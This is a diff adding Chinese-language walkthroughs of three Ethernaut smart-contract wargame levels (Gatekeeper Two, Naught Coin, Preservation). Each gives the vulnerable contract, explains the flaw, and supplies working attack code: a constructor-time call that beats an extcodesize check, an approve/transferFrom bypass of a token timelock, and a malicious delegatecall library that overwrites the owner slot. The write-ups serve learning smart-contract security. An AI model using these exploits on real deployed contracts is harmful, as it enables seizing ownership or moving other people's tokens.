@@ -724,3 +724,196 @@ contract GatekeeperOneExploit {
     }
 }
 ```
+
+# Gatekeeper Two
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperTwo {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        uint256 x;
+        assembly {
+            x := extcodesize(caller())
+        }
+        require(x == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+题目相关资料：
+- [solidity cheatsheet](https://docs.soliditylang.org/en/v0.4.23/miscellaneous.html#cheatsheet)
+- [solidity assembly](https://docs.soliditylang.org/en/v0.4.23/assembly.html)
+
+gateOne 同理，通过代理合约即可。gateTwo 的 extcodesize, 它返回 caller() 的合约代码大小。
+```solidity
+modifier gateTwo() {
+        uint256 x;
+        assembly {
+            x := extcodesize(caller()) // 内联汇编，caller() 相当于 msg.sender()，extcodesize 用于获取指定地址上存储的合约代码大小
+        }
+        require(x == 0);
+        _;
+    }
+```
+- 要求调用者的合约代码大小为0，意味着在调用这个合约时，调用者合约还没有部署完整。在 Solidity 中，当合约构造函数正在执行时，合约的代码还没有完全部署，extcodesize 会返回0。因此，我们可以在合约的构造函数中完成对 GatekeeperTwo 的调用，绕过这一检查；
+- gateThree 看似复杂，但异或其实很简单：`_gateKey = uint64(keccak256(msg.sender)) ^ type(uint64).max`；
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns(bool);
+}
+
+contract Attack {
+    IGatekeeperTwo public gatekeeper = IGatekeeperTwo(0xFC25F472366970CB5587aE22e4AACFbb02FBc589);
+
+    constructor() {
+        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+        gatekeeper.enter(gateKey);
+    }
+}
+```
+
+# Naught Coin
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+
+contract NaughtCoin is ERC20 {
+    // string public constant name = 'NaughtCoin'; // 调用父类构造函数传进去的
+    // string public constant symbol = '0x0'; // 调用父类构造函数传进去的
+    // uint public constant decimals = 18; // 这里的注释指的是 ERC20 的默认逻辑
+    uint256 public timeLock = block.timestamp + 10 * 365 days;
+    uint256 public INITIAL_SUPPLY;
+    address public player;
+
+    constructor(address _player) ERC20("NaughtCoin", "0x0") {
+        player = _player;
+        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals())); // decimals() 默认值18，这里是发放 1000000 枚token 的意思
+        // _totalSupply = INITIAL_SUPPLY;
+        // _balances[player] = INITIAL_SUPPLY;
+        _mint(player, INITIAL_SUPPLY); // 实现了上面注释的逻辑
+        emit Transfer(address(0), player, INITIAL_SUPPLY);
+    }
+
+    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
+        super.transfer(_to, _value);
+    }
+
+    // Prevent the initial owner from transferring tokens until the timelock has passed
+    modifier lockTokens() {
+        if (msg.sender == player) {
+            require(block.timestamp > timeLock);
+            _;
+        } else {
+            _;
+        }
+    }
+}
+```
+目标是将我的地址余额变为0。由于 transfer 被时间锁限制，我们需要找到一种可以绕过 transfer 函数的方式。这个题需要一些关于 ERC20 的背景知识：
+- ERC20 代码: [github](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol)
+- [ERC20-标准源代码-语法导读](https://github.com/SeeDAO-OpenSource/DEV-NoviceVillage/blob/master/1.%E7%BB%BC%E5%90%88%E6%80%A7%E7%90%86%E8%A7%A3/Token/ERC20-%E6%A0%87%E5%87%86%E6%BA%90%E4%BB%A3%E7%A0%81-%E8%AF%AD%E6%B3%95%E5%AF%BC%E8%AF%BB.md)
+
+阅读完上述材料后我们知道，除了 transfer，还有 approve 和 transferFrom。虽然合约限制了 transfer 函数，但并没有限制 approve 和 transferFrom 函数。ERC20 除了直接 transfer 之外，为了可组合性，还实现了授权转账功能。我们可以利用授权转账功能来绕过 token lock。
+
+```js
+await contract.approve(player, toWei("1000000"))
+await contract.transferFrom(player, instance, toWei("1000000"))
+```
+
+# Preservation
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint256 storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+        timeZone1Library = _timeZone1LibraryAddress;
+        timeZone2Library = _timeZone2LibraryAddress;
+        owner = msg.sender;
+    }
+    
+    // set the time for timezone 1
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint256 storedTime;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+    }
+}
+```
+- 这道题的核心在于利用delegatecall的上下文保留机制，通过调用外部合约代码来操作当前合约的存储布局，从而实现攻击目标。delegatecall 修改的本质上是 Preservation 中的变量。
+
+首先需要理解 Preservation 合约的存储结构：
+- timeZone1Library - 存储在 slot 0
+- timeZone2Library - 存储在 slot 1
+- owner - 存储在 slot 2
+- storedTime - 存储在 slot 3
+
+在 LibraryContract 中，只有一个状态变量： storedTime - 存储在 slot 0。setTime 实际上修改的是 address public timeZone1Library。
+
+编写并部署一个恶意合约 MaliciousLibrary，该合约与 LibraryContract 有相同的函数签名 setTime(uint256)，但它将操作 Preservation 合约的存储槽 2（即 owner 变量），并将 owner 替换为攻击者的地址。
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MaliciousLibrary {
+    function setTime(uint256) public {
+        address attacker = address(uint160(msg.sender));
+        assembly {
+            sstore(2, attacker) // sstore(slot, value)，使用 sstore 可以绕过 Solidity 对变量访问的限制，例如在没有声明对应的状态变量时直接修改存储槽的值。
+        }
+    }
+}
+```
+
+```js
+await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7")
+await contract.timeZone1Library()
+// 0x6b14047235Ae884f97bb15aba68d40D951A2a9F7
+await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7") // 随便传参数反正不会用
+await contrcat.owner()
+```
